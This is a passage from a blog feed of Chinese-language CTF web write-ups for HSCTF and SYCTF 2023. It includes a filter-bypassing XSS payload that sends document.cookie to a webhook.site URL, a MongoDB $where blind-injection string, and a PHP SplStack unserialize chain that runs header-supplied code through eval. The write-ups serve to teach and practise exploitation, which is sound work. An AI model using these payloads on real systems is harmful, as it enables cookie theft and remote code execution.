class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">Arg</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sanitized = <span class="title function_">sanitize</span>(<span class="title class_">Arg</span>(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">content.<span class="property">innerHTML</span> = sanitized;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="title class_">Arg</span>(<span class="string">&quot;background_color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="title class_">Arg</span>(<span class="string">&quot;color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">fontFamily</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font&quot;</span>);</span><br><span class="line">content.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font_size&quot;</span>) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">display</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>虽然过滤了一些标签，但是因为是替换给空，所以可以使用<strong>双写绕过</strong></p><p><img src="../images/image-20230616204154238.png" alt="image-20230616204154238"></p><p><code>content</code> 写<code>xss</code>代码 </p><p><img src="../images/image-20230616204225564.png" alt="image-20230616204225564"></p><p><strong>这里传新生成的页面给机器人访问</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x oonnerror=<span class="string">&#x27;document.locatioonn=&quot;https://webhook.site/763b1516-a326-4e4e-8327-7954bf30e2da?&quot;+document.ccookieookie&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616204737798.png" alt="image-20230616204737798"></p><p>成功</p><h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag-shop"></a><strong>flag-shop</strong></h2><p>这是一道<code>mogodb</code>的盲注题目</p><p><img src="../images/image-20230616205615839.png" alt="image-20230616205615839"></p><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo.errors</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.getenv(<span class="string">&quot;FLASK_SECRET&quot;</span>)</span><br><span class="line">mongo_client = MongoClient(connect=<span class="literal">False</span>)</span><br><span class="line">db = mongo_client.database</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/search&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line"><span class="keyword">if</span> request.json <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&quot;search&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.json:</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No search provided&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">400</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">results = db.flags.find(</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;$where&quot;</span>: <span class="string">f&quot;this.challenge.includes(&#x27;<span class="subst">&#123;request.json[<span class="string">&#x27;search&#x27;</span>]&#125;</span>&#x27;)&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line"><span class="string">&quot;_id&quot;</span>: <span class="literal">False</span>,</span><br><span class="line"><span class="string">&quot;flag&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line">).sort(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> pymongo.errors.PyMongoError:</span><br><span class="line">traceback.print_exc()</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Database error&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">500</span></span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;results&quot;</span>: <span class="built_in">list</span>(results)&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>根据这个代码来看的话</p><p><img src="../images/image-20230616205858592.png" alt="image-20230616205858592"></p><p>这里的话是在<code>challenge</code>  这个表里查数据  </p><p><code>id</code>和<code>flag</code>是不给查的    但是我们可以包含上面的<code>include</code>语句，来重新查一个<code>flag</code>表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)==this.flag.includes(&#x27;</span>xxx</span><br></pre></td></tr></table></figure><p>xx后面就是想要爆破的字符串了</p><p>这里的话<code>include</code>的话就是  <strong>查找表里是否有相对应的字符串</strong></p><p>例如 <code>flag</code>   随便输入4个字母中的一个  就会将<code>flag</code>给输出出来  这就是<code>include</code>的作用</p><p><img src="../images/image-20230616212203808.png" alt="image-20230616212203808"></p><p>查询成功就会输出全部挑战</p><p><img src="../images/image-20230616212223885.png" alt="image-20230616212223885"></p><p>查询失败就啥也没有</p><p>这里在记录一个<code>ejs3.1.9</code>的漏洞题</p><p><a href="https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#star-cereal-episode-4-a-new-pigeon">wp1 </a>     <a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">wp2</a></p><p>下次遇到<code>ejs 3.1.9</code>的题  这里直接秒就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的写这个wp的原因是这里有几道题考察的是&lt;code&gt;mongodb&lt;/code&gt;的注入   &lt;/p&gt;
&lt;p&gt;(&lt;strong&gt;之前没咋见过，都是做mysql的居多&lt;/strong&gt;)  &lt;/p&gt;
&lt;p&gt;之前见过一次还是在  &lt;a href=&quot;https://ke1nys</summary>
      
    
    
    
    
    <category term="hsctf-web-2023" scheme="https://ke1nys.github.io/tags/hsctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>syctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/eb3b498d.html"/>
    <id>https://ke1nys.github.io/posts/eb3b498d.html</id>
    <published>2023-06-16T09:47:50.000Z</published>
    <updated>2023-06-16T11:49:04.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;VanZZZZY&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;VanZZZZY&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;givemegirlfriend!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616180925417.png" alt="image-20230616180925417"></p><p>重点在这个正则这里，这里的话是只能使用字母下划线和括号还有<code>;</code></p><p>那么就可以猜出来这里是考察的使用函数来进行<code>RCE</code></p><p><img src="../images/image-20230616181103226.png" alt="image-20230616181103226"></p><p>这里的话对序列化字符也有限制，就是不能使用<code>O</code>和<code>a</code>打头的，那么就只剩一种了，就是之前<code>ctfshow</code>出的一个题了   就是使用内置类   <strong><code>C</code>打头的</strong>  <a href="https://ke1nys.github.io/posts/28e06bac.html#easy-php">C打头的内置类</a></p><p>(<strong>这里的<code>a</code>打头就是在<code>O</code>打头的基础上加个<code>array()</code>函数而已</strong>)</p><p>还把<code>array</code>打头的类给禁掉了，不过没事</p><p><img src="../images/image-20230616185732553.png" alt="image-20230616185732553"></p><p>这些类都可以使用</p><p>只不过<code>Spl</code>开头的相对于<code>Array</code>打头的多一个<code>push()</code>函数</p><p>所以说先构造一下链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;rce&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br></pre></td></tr></table></figure><p>链子就构造完成了，但是这个执行命令的时候会有一个麻烦就是</p><p><code>eval($this-&gt;cmd.&#39;givemegirlfriend!&#39;);</code>这个后面会有一个字符串，并且<code>;</code>的会被替换掉，不能使用，所以这里的话就得使用一个新的方法</p><p><code>__HALT_COMPILER()</code>函数来截断后面的非法语句，这个熟悉phar协议的师傅都知道，它是phar文件的文件标识，这个函数会中断php的执行，并且不会检查后面的语句，而exit()这些中断函数即使中断了也会检查后面的php语句，如果报错则会抛出错误，所以这里是不能用exit和die的。</p><p>然后因为这个只能通过函数方法来进行rce,那么这里就有两篇文章专门讲了这个</p><p><a href="https://xz.aliyun.com/t/10780">讲的是使用函数来进行rce</a>     <a href="https://guokeya.github.io/post/tckzWc_Xo/">也是讲的函数RCE</a></p><p><strong>最后的payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;eval(end(getallheaders()));__HALT_COMPILER();&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//这里话不只有SplStack这个类可以使用，上面图片中含有的类都可以使用</span></span><br></pre></td></tr></table></figure><p><code>getallheaders()</code>这个函数是得在<code>apache</code>服务器下使用的，<code>nginx</code>不行</p><p><img src="../images/image-20230616191354197.png" alt="image-20230616191354197"></p><p>成功执行代码</p><h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><p><strong>这里的因为没有环境，所以就不复现了</strong></p><p>这题的话是由预期解是<strong>主从复制</strong>   <a href="https://www.kdocs.cn/l/cmbPrknYHg1V">主从复制wp1</a>    <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493926&amp;idx=1&amp;sn=58a1fa641fddb963c6f1c9e5968a5422&amp;chksm=e8a1caf7dfd643e12e5bc1f434bfae55f53693104f81920dc4ce3d4c534b235add654a083c5e&amp;mpshare=1&amp;scene=23&amp;srcid=0612QirgfrJoQ8N2ZyL6HJTv&amp;sharer_sharetime=1686542128876&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">主从复制wp2</a></p><p>非预期1是<strong>日志写入马</strong>    <a href="https://www.cnblogs.com/F12-blog/p/17472787.html">日志写马1</a>   <a href="http://acexze.cn/?post=13">日志写马2</a></p><p>非预期2是修改用户属性    <a href="https://www.cnblogs.com/Aann/p/17473430.html">修改用户属性</a></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>这是题目的项目地址  <a href="https://github.com/thewhitetulip/Tasks-vue/blob/master/db/tasks.go#LL11C6-L11C16">tasks</a></p><p>就是通过审计这个代码来发现漏洞利用点的</p><p><a href="https://www.kdocs.cn/l/cmbPrknYHg1V">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;4号的罗纳尔多&quot;&gt;&lt;a href=&quot;#4号的罗纳尔多&quot; class=&quot;headerlink&quot; title=&quot;4号的罗纳尔多&quot;&gt;&lt;/a&gt;4号的罗纳尔多&lt;/h2&gt;&lt;p&gt;题目代码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    
    <category term="syctf-web-2023" scheme="https://ke1nys.github.io/tags/syctf-web-2023/"/>
    
  </entry>
  
</feed>
